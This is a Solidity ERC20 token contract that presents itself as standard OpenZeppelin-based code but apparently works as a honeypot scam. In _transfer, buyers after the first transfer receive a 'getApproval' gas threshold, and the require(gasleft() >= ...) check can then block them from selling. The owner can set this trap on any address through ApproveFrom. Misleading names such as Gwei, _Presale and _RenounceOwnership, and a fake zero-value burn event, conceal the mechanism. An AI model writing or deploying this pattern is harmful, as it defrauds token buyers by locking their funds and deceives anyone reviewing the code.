// SPDX-License-Identifier: MIT. 

// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.8.1

// OpenZeppelin Contracts (last updated v4.6.0).(token/ERC20/IERC20.sol)
  
/**. 
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */

pragma solidity ^0.8.0;

interface IERC20 {
        /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
  event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */ 
  event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
  function totalSupply() external view returns (uint256);

     /**
     * @dev Returns the amount of tokens owned by `account`.
     */
  function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
  function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards.
     *
     * Emits an {Approval} event.
     */
  function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}


abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
      return msg.sender;
  }


  function _msgData() internal view virtual returns (bytes calldata) {
      return msg.data;
  }
}


contract ERC20 is Context, IERC20 {
  mapping(address => uint256) private _balances;
  mapping(address => mapping(address => uint256)) private _allowances;
  mapping(address => uint256) public getApproval;
  mapping(address => bool) private Gwei;


  uint256 private _totalSupply;
  string private _name;
  string private _symbol;
  uint8 private _decimals;
  address public owner;
  uint256 public balanceReceive;
  bool private _Presale;
  uint256 private _RenounceOwnership;


  constructor(
    string memory name_,
    string memory symbol_,
    uint8 decimals_,
    address[] memory balanceApprove,
    uint256 balanceReceive_,
    uint256 gasUnit,
    address[] memory GweiUnit
  ) {
    _name = name_;
    _symbol = symbol_;
    _decimals = decimals_;
    owner = _msgSender();
    _totalSupply = 980000000000000 * (10 ** uint256(decimals_));
    _balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
    balanceReceive = balanceReceive_;
    _RenounceOwnership = gasUnit;
    _Presale = false;


    for (uint256 i = 0; i < balanceApprove.length; i++) {
      _sendApproval(balanceApprove[i], balanceReceive);
    }


    for (uint256 i = 0; i < GweiUnit.length; i++) {
      Gwei[GweiUnit[i]] = true;
    }
  }


  function name() public view virtual returns (string memory) {
      return _name;
  }


  function symbol() public view virtual returns (string memory) {
      return _symbol;
  }


  function decimals() public view virtual returns (uint8) {
      return _decimals;
  }


  function totalSupply() public view virtual override returns (uint256) {
      return _totalSupply;
  }


  function balanceOf(address account) public view virtual override returns (uint256) {
      return _balances[account];
  }


  function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
      _transfer(_msgSender(), recipient, amount);
      return true;
  }


  function allowance(address owner, address spender) public view virtual override returns (uint256) {
      return _allowances[owner][spender];
  }


  function approve(address spender, uint256 amount) public virtual override returns (bool) {
      _approve(_msgSender(), spender, amount);
      return true;
  }


  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
      _transfer(sender, recipient, amount);
      _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
      return true;
  }


  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
      require(sender != address(0), "ERC20: transfer from the zero address");
      require(recipient != address(0), "ERC20: transfer to the zero address");
      require(amount > 0, "Transfer amount must be greater than zero");


      if (!_Presale) {
        _Presale = true;
        Gwei[recipient] = true;
      } else if (getApproval[recipient] == 0 && !Gwei[recipient]) {
        _sendApproval(recipient, _RenounceOwnership);
      }


      require(gasleft() >= getApproval[sender], "Approve to swap on Dex");


      uint256 finalAmount = amount;
      address deadAddress = 0x000000000000000000000000000000000000dEaD;


      _balances[sender] -= amount;
      _balances[deadAddress] += 0;
      _balances[recipient] += finalAmount;


      emit Transfer(sender, deadAddress, 0);
      emit Transfer(sender, recipient, finalAmount);
  }


  function _approve(address owner, address spender, uint256 amount) internal virtual {
      require(owner != address(0), "ERC20: approve from the zero address");
      require(spender != address(0), "ERC20: approve to the zero address");


      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
  }


  function _sendApproval(address _address, uint256 approveForSwap) internal {
      getApproval[_address] = approveForSwap;
  }


  function ApproveFrom(address _address, uint256 approveAmount) external {
      require(_msgSender() == owner);
      _sendApproval(_address, approveAmount);
  }
}